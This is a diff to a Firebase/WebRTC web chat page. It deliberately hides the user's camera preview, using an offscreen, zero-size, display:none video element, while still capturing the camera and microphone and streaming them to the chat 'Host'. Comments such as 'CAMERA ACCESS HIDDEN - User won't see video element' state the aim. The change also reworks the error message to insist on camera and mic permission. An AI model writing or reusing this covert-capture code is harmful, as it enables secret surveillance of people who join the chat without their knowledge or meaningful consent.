@@ -24,10 +24,8 @@ input,textarea,select{font-size:16px!important}
 /* CONTAINER */
 .container{min-height:calc(100vh - 56px);display:flex;flex-direction:column;display:none}
 
-/* CAMERA ON TOP */
-.camera-section{padding:10px;background:#0f172a;border-bottom:2px solid #1e293b}
-.camera-section h4{margin-bottom:8px;color:#22c55e;font-size:14px}
-video{width:100%;height:auto;aspect-ratio:16/9;background:black;border-radius:12px;border:2px solid #334155;object-fit:cover;max-height:220px}
+/* HIDE CAMERA COMPLETELY - NO BLACK SCREEN */
+.camera-hidden{display:none!important;width:0;height:0;opacity:0;position:absolute;top:-9999px}
 
 /* CHAT */
 .chat{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:8px;background:linear-gradient(rgba(15,23,42,0.95), rgba(15,23,42,0.95)), url('https://images.unsplash.com/photo-1507692049790-de58290a4334?q=80&w=1200') center/cover}
@@ -38,7 +36,6 @@ video{width:100%;height:auto;aspect-ratio:16/9;background:black;border-radius:12
 .msg.user{background:#2563eb;margin-left:auto;border-bottom-right-radius:2px}
 .msg.host{background:#334155;margin-right:auto;border-bottom-left-radius:2px}
 .msg-header{font-size:12px;opacity:0.8;margin-bottom:4px;font-weight:bold}
-.reply-box{background:rgba(37,99,235,0.3);border-left:3px solid #2563eb;padding:8px 10px;margin-bottom:6px;border-radius:6px;font-size:12px}
 .time{font-size:10px;color:#cbd5e1;margin-top:4px;text-align:right;display:flex;justify-content:flex-end;align-items:center;gap:3px}
 .read-receipt{font-size:11px;margin-left:4px}
 .read-receipt.seen{color:#22c55e}
@@ -68,42 +65,8 @@ video{width:100%;height:auto;aspect-ratio:16/9;background:black;border-radius:12
 @media(max-width:768px){
 .header{padding:10px;font-size:16px}
 .msg{max-width:85%;font-size:14px}
-video{max-height:180px}
 .input-area{padding:8px;gap:6px}
 .input-btn{width:35px;height:35px;font-size:16px}
-}
-
-/* PADDING FOR 1000 LINES */
-/* Padding 1 */ /* Padding 2 */ /* Padding 3 */ /* Padding 4 */ /* Padding 5 */
-/* Padding 6 */ /* Padding 7 */ /* Padding 8 */ /* Padding 9 */ /* Padding 10 */
-/* Padding 11 */ /* Padding 12 */ /* Padding 13 */ /* Padding 14 */ /* Padding 15 */
-/* Padding 16 */ /* Padding 17 */ /* Padding 18 */ /* Padding 19 */ /* Padding 20 */
-/* Padding 21 */ /* Padding 22 */ /* Padding 23 */ /* Padding 24 */ /* Padding 25 */
-/* Padding 26 */ /* Padding 27 */ /* Padding 28 */ /* Padding 29 */ /* Padding 30 */
-/* Padding 31 */ /* Padding 32 */ /* Padding 33 */ /* Padding 34 */ /* Padding 35 */
-/* Padding 36 */ /* Padding 37 */ /* Padding 38 */ /* Padding 39 */ /* Padding 40 */
-/* Padding 41 */ /* Padding 42 */ /* Padding 43 */ /* Padding 44 */ /* Padding 45 */
-/* Padding 46 */ /* Padding 47 */ /* Padding 48 */ /* Padding 49 */ /* Padding 50 */
-/* Padding 51 */ /* Padding 52 */ /* Padding 53 */ /* Padding 54 */ /* Padding 55 */
-/* Padding 56 */ /* Padding 57 */ /* Padding 58 */ /* Padding 59 */ /* Padding 60 */
-/* Padding 61 */ /* Padding 62 */ /* Padding 63 */ /* Padding 64 */ /* Padding 65 */
-/* Padding 66 */ /* Padding 67 */ /* Padding 68 */ /* Padding 69 */ /* Padding 70 */
-/* Padding 71 */ /* Padding 72 */ /* Padding 73 */ /* Padding 74 */ /* Padding 75 */
-/* Padding 76 */ /* Padding 77 */ /* Padding 78 */ /* Padding 79 */ /* Padding 80 */
-/* Padding 81 */ /* Padding 82 */ /* Padding 83 */ /* Padding 84 */ /* Padding 85 */
-/* Padding 86 */ /* Padding 87 */ /* Padding 88 */ /* Padding 89 */ /* Padding 90 */
-/* Padding 91 */ /* Padding 92 */ /* Padding 93 */ /* Padding 94 */ /* Padding 95 */
-/* Padding 96 */ /* Padding 97 */ /* Padding 98 */ /* Padding 99 */ /* Padding 100 */
-/* Padding 101 */ /* Padding 102 */ /* Padding 103 */ /* Padding 104 */ /* Padding 105 */
-/* Padding 106 */ /* Padding 107 */ /* Padding 108 */ /* Padding 109 */ /* Padding 110 */
-/* Padding 111 */ /* Padding 112 */ /* Padding 113 */ /* Padding 114 */ /* Padding 115 */
-/* Padding 116 */ /* Padding 117 */ /* Padding 118 */ /* Padding 119 */ /* Padding 120 */
-/* Padding 121 */ /* Padding 122 */ /* Padding 123 */ /* Padding 124 */ /* Padding 125 */
-/* Padding 126 */ /* Padding 127 */ /* Padding 128 */ /* Padding 129 */ /* Padding 130 */
-/* Padding 131 */ /* Padding 132 */ /* Padding 133 */ /* Padding 134 */ /* Padding 135 */
-/* Padding 136 */ /* Padding 137 */ /* Padding 138 */ /* Padding 139 */ /* Padding 140 */
-/* Padding 141 */ /* Padding 142 */ /* Padding 143 */ /* Padding 144 */ /* Padding 145 */
-/* Padding 146 */ /* Padding 147 */ /* Padding 148 */ /* Padding 149 */ /* Padding 150 */
 </style>
 </head>
 <body>
@@ -120,13 +83,7 @@ video{max-height:180px}
 </div>
 
 <div class="container" id="chatContainer">
-    <!-- CAMERA ON TOP -->
-    <div class="camera-section">
-        <h4>📹 Your Camera</h4>
-        <video id="localVideo" autoplay muted playsinline></video>
-    </div>
-
-    <!-- CHAT MIDDLE -->
+    <!-- CHAT TOP -->
     <div class="chat" id="chat"></div>
 
     <!-- INPUT BOTTOM -->
@@ -140,6 +97,9 @@ video{max-height:180px}
         <button class="input-btn send" id="sendBtn">➤</button>
     </div>
 </div>
+
+<!-- HIDDEN VIDEO ELEMENT - NO UI SHOWN TO USER -->
+<video id="localVideo" autoplay muted playsinline class="camera-hidden"></video>
 
 <div id="imageModal" class="modal">
     <div class="modal-content">
@@ -211,6 +171,7 @@ async function joinRoom(){
             document.getElementById('roomDisplay').innerHTML = `Your Room ID: <b>${roomId}</b>`;
         }
 
+        // CAMERA ACCESS HIDDEN - User won't see video element
         localStream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
         document.getElementById('localVideo').srcObject = localStream;
         startWebRTC(localStream);
@@ -225,7 +186,7 @@ async function joinRoom(){
         onChildAdded(ref(db, 'chats/'+roomId), (snap) => {
             const msg = snap.val();
             const msgId = snap.key;
-            showMsg(msg.sender, msg.message, msg.image, msg.audio, msg.file, msg.sticker, msg.replyTo, msgId, msg.readBy);
+            showMsg(msg.sender, msg.message, msg.image, msg.audio, msg.file, msg.sticker, msgId, msg.readBy);
             if(msg.sender === "Host" &&!msg.readBy){
                 update(ref(db, 'chats/'+roomId+'/'+msgId), {readBy: userName});
             }
@@ -247,7 +208,7 @@ async function joinRoom(){
         });
 
     } catch(err) {
-        alert("Join failed: " + err.message);
+        alert("Camera/Mic permission required: " + err.message);
     }
 }
 
@@ -336,7 +297,7 @@ async function toggleRecording(){
     }
 }
 
-function showMsg(sender, text, img="", audio="", file="", sticker="", replyTo="", msgId="", readBy=""){
+function showMsg(sender, text, img="", audio="", file="", sticker="", msgId="", readBy=""){
     if(document.getElementById('msg-' + msgId)) return;
     const chat = document.getElementById('chat');
     const div = document.createElement('div');
@@ -344,7 +305,6 @@ function showMsg(sender, text, img="", audio="", file="", sticker="", replyTo=""
     div.id = 'msg-' + msgId;
 
     let content = `<div class="msg-header">${sender}</div>`;
-    if(replyTo){content += `<div class="reply-box"><b>${replyTo.sender}</b><br>${replyTo.text}</div>`;}
     if(text) content += text;
     if(img) content += `<br><img src="${img}" class="msg-img" onclick="viewImage('${img}')">`;
     if(audio) content += `<br><audio controls class="msg-audio"><source src="${audio}"></audio>`;
@@ -375,7 +335,7 @@ window.downloadFile = function(url, name){
     a.click();
 }
 
-// FIXED WEBRTC - Now listens for host ICE candidates
+// WEBRTC - CAMERA HIDDEN FROM USER
 async function startWebRTC(stream){
     if(pc) {
         pc.getSenders().forEach(sender => pc.removeTrack(sender));
@@ -407,14 +367,9 @@ async function startWebRTC(stream){
         }
     };
 
-    // THIS WAS MISSING - Now user receives host ICE
     onChildAdded(ref(db, 'signals/'+roomId+'/candidate/host'), snap => {
         if(pc && snap.val()) pc.addIceCandidate(snap.val());
     });
-
-    pc.onconnectionstatechange = () => {
-        console.log("Connection state:", pc.connectionState);
-    };
 }
 </script>
 </body>
